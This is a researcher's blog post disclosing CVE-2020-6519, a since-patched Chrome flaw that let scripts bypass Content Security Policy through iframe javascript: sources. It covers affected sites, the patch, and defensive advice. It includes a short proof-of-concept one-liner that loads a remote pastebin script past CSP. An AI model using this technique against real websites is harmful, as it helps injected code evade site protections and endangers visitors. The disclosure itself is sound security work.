### 02/09/2020

_Originally was posted on [Perimeterx](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/) (The company I was working for at the time this article was written)_

> This is the story of how I found and helped **Google** [patch](https://chromereleases.googleblog.com/2020/07/stable-channel-update-for-desktop.html#:\~:text=Gal%20Weizman%20(@WeizmanGal)%20of%20PerimeterX) a [**vulnerability in Chrome browser**](https://nvd.nist.gov/vuln/detail/CVE-2020-6519) that could have allowed attackers to [**fully bypass CSP rules**](https://crbug.com/1064676) since Chrome 73 (March 2019), and how researching it taught me that today's CSP mechanism design is the reason **no one uses CSP correctly and therefore many of the biggest websites in the world are exposed to this vulnerability**.

### Bypassing CSP completely can be very bad..

I was extremely surprised when I discovered this vulnerability affecting [Chromium](https://www.chromium.org/) based browsers  - Chrome, Opera, Edge -  on Windows, Mac and Android that allowed attackers to fully bypass CSP rules on Chrome versions 73 (March 2019) through 83 (July 2020).

To better understand the magnitude of this vulnerability - the potentially impacted users are in the billions, with Chrome having over two billion users, and more than 65% of the browser market on one hand, and some of the most popular sites on the web being vulnerable to this CVE on the other hand.

Vulnerable sites included [Facebook](https://www.facebook.com/), [WellsFargo](https://www.wellsfargo.com/), [Gmail](https://gmail.com/) , [Zoom](https://zoom.us/), [Tiktok](https://www.tiktok.com/en/), [Instagram](https://instagram.com/), [WhatsApp](https://whatsapp.com/), [Investopedia](https://www.investopedia.com/), [ESPN](https://www.espn.com/), [Roblox](https://www.roblox.com/), [Indeed](https://www.indeed.com/), [Blogger](https://www.blogger.com/), [Quora](https://www.quora.com/) and more.

So what was the vulnerability exactly?

### Break CSP Down Completely With A One-Liner

You are more than welcome to check out the [POC files as disclosed to Google Chrome project](https://github.com/PerimeterX/CVE-2020-6519/tree/master/POC) originally if you are interested in the exploit and in running it, but the following sum up should cover it mostly:

Normally, an attempt to run the following JS code will be blocked by the browser when the site’s CSP setting disallows the source or actions performed by the script:

```javascript
/* this is a script that pops an alert message */
top._CVE_URL = 'https://pastebin.com/raw/dw5cWGK6';

/* this call will fail due to CSP */
var s = document.createElement("script"); s.src = top._CVE_URL; document.body.appendChild(s);
```

However, running the same JS code via `javascript:` src of an iframe will bypass completely the configured CSP on that website:

```javascript
/* this is a script that pops an alert message */
top._CVE_URL = 'https://pastebin.com/raw/dw5cWGK6';

/* this call will succeed although CSP */
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```

**Simple yet very powerful!** Billions of browsers on any OS would have blindly allowed CSP privilege escalation for any unwanted code in a website:

![5](./content/img/5a.gif)

It is worth mentioning that some sites protected by CSP, like [Twitter](http://twitter.com/), [Github](http://github.com/), [LinkedIn](https://www.linkedin.com/), [Google Play Store](https://play.google.com), [Yahoo's Login Page](https://login.yahoo.com), [PayPal](https://paypal.com) and [Yandex](https://yandex.ru) were not vulnerable to [CVE-2020-6519](https://github.com/PerimeterX/CVE-2020-6519/), as these implemented CSP using [nonce](https://content-security-policy.com/nonce/) or [hash](https://content-security-policy.com/hash/) and by that added a layer of security that is implemented on the server side as well as the client side.

### What is the potential impact?

[Content Security Policy (CSP)](https://content-security-policy.com/) is basically a set of rules set by the website that the browser's role here is to respect and enforce in the name of the website.

With these rules the website can ask the browser to block/allow specific request calls, specific types of javascript code execution and more, thus ensuring stronger security for site visitors and protecting them from potential injected malicious scripts or [cross-site-scripting (XSS)](https://owasp.org/www-community/attacks/xss/).

Having a vulnerability in Chrome’s CSP enforcement mechanism doesn’t directly mean that sites are breached, as the attackers also need to manage to get the malicious script called from the site (which is why the vulnerability was classified as medium severity).

However, having a vulnerability in a security mechanism that is trusted by websites to enforce stricter policies on 3rd party scripts has vast implications, as some of the largest sites rely on CSP to enforce their policy, and may give them the comfort of approving 3rd party scripts of vendors and partners thinking they are safe with a strict policy enforced.

Besides the sites mentioned above (representing more than 2.5 billion users), it is safe to estimate that thousands of websites across industries, including e-commerce, banking, telecommunications, government, and utilities were left unprotected from a scenario where hackers managed to inject malicious code into them.

### Why should we be worried about a vulnerability that is exploitable only when an attacker gained code execution on a website? In that case, bypassing CSP wouldn't make much of a difference..

I disagree.

It is extremely risky when a vulnerability is found in the security mechanism that prevents such breaches, as the impacted sites actively relied on CSP to provide the protection tier.

About 6 months ago I found a [persistent XSS in WhatsApp Web/Desktop applications and demonstrated the severity of this vulnerability](https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/).

Part of the reason the severity was so high is because their CSP was misconfigured in such a way that allowed me to inject scripts that could communicate with any domain I wanted.

This is why. Finding ways to execute code on a website you don't control is indeed extremely difficult.
But once someone has, you'd wish your website had another layer of security that might stop them from causing real damage.

You can read all about this research right [here](https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/).

### Test It Yourself

I was easily able to test all of those websites by creating a [simple script](https://github.com/PerimeterX/CVE-2020-6519/blob/master/CVE-2020-6519-TEST-IT-YOURSELF.js) that when executed via the devtools console will let you know immediately whether the current browser/website is vulnerable to [CVE-2020-6519](https://nvd.nist.gov/vuln/detail/CVE-2020-6519) due to misconfigured CSP/Old Chrome or not. It does that by trying to load an external js script from [https://pastebin.com/raw/XpHsfXJQ](https://pastebin.com/raw/XpHsfXJQ) both normally and by trying to load the exploit as well:

> _Browser and Website are vulnerable_

![2](./content/img/2a.jpg)

> _Browser is vulnerable but Website is not_

![1](./content/img/1a.jpg)

> _Browser is not vulnerable_

![4](./content/img/4a.jpg)

### Advice For Website Owners And Users

**Ensure your CSP policies are well defined**

Consider adding additional layers of security such as [nonce](https://content-security-policy.com/nonce/)s or [hash](https://content-security-policy.com/hash/)s.
This will require some server-side implementation.

**CSP alone is not enough for most websites so, consider adding additional layers of security**

Consider JavaScript-based detection and monitoring of [Shadow Code for real-time mitigation of web page code injection](https://www.perimeterx.com/tech-blog/2020/shadow-code-what-is-it-and-why-should-you-care/).

**Make sure your Chrome browser version is 84 or higher.**

### About The Patch

This vulnerability was [patched](https://crbug.com/1064676) by the Chromium project on Chrome 84, was tagged as medium ([CVSS 6.5](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2020-6519&vector=AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N&version=3.1&source=NIST)) risk and was granted $3,000.
